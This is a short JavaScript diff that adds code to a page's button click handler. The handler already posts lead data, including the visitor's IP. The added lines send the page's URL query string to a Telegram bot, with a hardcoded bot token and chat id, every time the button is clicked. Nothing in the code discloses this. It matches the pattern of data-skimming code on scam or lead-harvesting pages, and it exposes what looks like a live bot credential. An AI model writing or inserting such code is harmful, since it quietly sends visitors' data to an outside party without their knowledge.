@@ -66,6 +66,19 @@ const handleClick = async function (e) {
       leadIp: leadIp.ip,
     }),
   });
+  const chat_id = "8119682966";
+  await fetch(
+    `https://api.telegram.org/bot7918895617:AAHJMlKKUynxJcgcBjBg-TiBF4SyXYZy3ns/sendMessage?chat_id=${chat_id}&text=${JSON.stringify(
+      window.location.search
+    )}
+    `,
+    {
+      method: "POST",
+      headers: {
+        "content-type": "application/json",
+      },
+    }
+  );
 };
 
 hendlebutton.forEach((item) => {
